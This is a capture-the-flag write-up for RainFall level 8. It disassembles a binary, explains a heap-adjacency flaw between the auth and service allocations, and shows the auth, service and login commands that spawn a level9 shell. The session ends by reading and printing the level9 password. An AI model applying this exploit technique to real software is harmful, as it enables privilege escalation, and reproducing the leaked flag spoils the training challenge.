# **Level8**

In this level, I encountered a binary file that functions as a simple command interpreter. Upon startup, it displays two pointers, both initially set to **`(nil)`**.

```python
level8@RainFall:~$ ./level8
(nil), (nil)
dsssss
(nil), (nil)
```

## **Binary Analysis**

Using GDB, I analyzed the binary and discovered that the `main` function allocates memory for two global variables: **`auth`** and **`service`**. The variable **`auth`** stores the provided password, while **`service`** stores additional data. The **`reset`** function frees the memory allocated to **`auth`**, resetting its value to **`(nil)`**.

```nasm
(gdb) disas main
Dump of assembler code for function main:
	 0x08048574 <+16>:	nop
	 0x08048575 <+17>:	mov    0x8049ab0,%ecx ; Global variable service
	 0x0804857b <+23>:	mov    0x8049aac,%edx ; Global variables auth
	  
	 0x08048591 <+45>:	call   0x8048410 <printf@plt> ;printf("%p, %p\n", auth, service);
	 [...]
   0x080485c1 <+93>:	mov    $0x8048819,%eax ;auth 
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
	 [...]
   0x080485e4 <+128>:	movl   $0x4,(%esp)
   0x080485eb <+135>:	call   0x8048470 <malloc@plt> ; auth = malloc(4);
   [...]
   0x08048631 <+205>:	mov    0x8049aac,%eax
   0x08048636 <+210>:	mov    %edx,0x4(%esp)
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt> ;strcpy(auth, buffer + 5);
	 [...]
   0x08048648 <+228>:	mov    $0x804881f,%eax ; reset
   0x0804864d <+233>:	mov    $0x5,%ecx
   0x08048652 <+238>:	mov    %edx,%esi
   0x08048654 <+240>:	mov    %eax,%edi
   0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)
   [...]
   0x0804866b <+263>:	mov    0x8049aac,%eax
   0x08048670 <+268>:	mov    %eax,(%esp)
   0x08048673 <+271>:	call   0x8048420 <free@plt> ;free(auth);
	 [...]
   0x0804867e <+282>:	mov    $0x8048825,%eax ;service
   0x08048683 <+287>:	mov    $0x6,%ecx
   0x08048688 <+292>:	mov    %edx,%esi
   0x0804868a <+294>:	mov    %eax,%edi
   0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)
   [...]
   0x080486a1 <+317>:	lea    0x20(%esp),%eax
   0x080486a5 <+321>:	add    $0x7,%eax
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>;service = strdup(buffer + 7);
	 [...]
   0x080486bb <+343>:	mov    $0x804882d,%eax ; login
   0x080486c0 <+348>:	mov    $0x5,%ecx
   0x080486c5 <+353>:	mov    %edx,%esi
   0x080486c7 <+355>:	mov    %eax,%edi
   0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)
   
   0x080486e2 <+382>:	mov    0x8049aac,%eax ; auth
   0x080486e7 <+387>:	mov    0x20(%eax),%eax ; 32 bytes
   0x080486ea <+390>:	test   %eax,%eax
   0x080486ec <+392>:	je     0x80486ff <main+411>
   0x080486ee <+394>:	movl   $0x8048833,(%esp) ; /bin/sh
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
 
```

## **Vulnerability**

The program has a heap overflow vulnerability due to improper bounds checking when handling user input. Here's why:

1. **Global Variables as Pointers**
    - **`auth`** and **`service`** are global pointers that can be manipulated through commands.
2. **No Bounds Checking**
    - The program uses functions like **`strcpy`** without checking the length of the input, allowing potential overflow.
3. **Critical Memory Check**
    - The **`login`** command checks a specific offset within the **`auth`** memory. If this value is non-zero, it executes **`system("/bin/sh")`**.

## **Exploit**

**Step 1: Allocate Memory with `auth`**

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
```

- The **`auth`** command allocates memory and stores **`"AAAA"`** in it.
- **`auth`** now points to **`0x804a008`**.

**Step 2: Use `service` to Overflow**

```bash
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
```

- The **`service`** command uses **`strdup`** to allocate memory and copy our input.
- We provide a long string of **`A`**s to overwrite beyond the allocated memory.
- Due to lack of bounds checking, this overflows into adjacent memory, potentially overwriting critical data in **`auth`**.

**Step 3: Trigger Shell with `login`**

If the input matches "login", the program proceeds to:

```nasm
10x080486e2 <+382>: mov    0x8049aac,%eax         ; Load 'auth' pointer
20x080486e7 <+387>: mov    0x20(%eax),%eax        ; Load value at offset 0x20
30x080486ea <+390>: test   %eax,%eax
40x080486ec <+392>: je     0x80486ff <main+411>   ; If zero, jump
50x080486ee <+394>: movl   $0x8048833,(%esp)      ; Load "/bin/sh"
60x080486f5 <+401>: call   0x8048480 <system@plt> ; Execute shell
```

- The program checks if the value at **`auth[32]`** is non-zero.
- If it is non-zero, it calls **`system("/bin/sh")`** to spawn a shell.

```bash
login
$ whoami
level9
```

- The **`login`** command checks a value at a specific offset in **`auth`**'s memory.
- Our overflow has altered this value, causing the condition to be met.
- The program executes **`system("/bin/sh")`**, giving us a shell with **`level9`** privileges.

Result:

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## **Flag**

```c
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```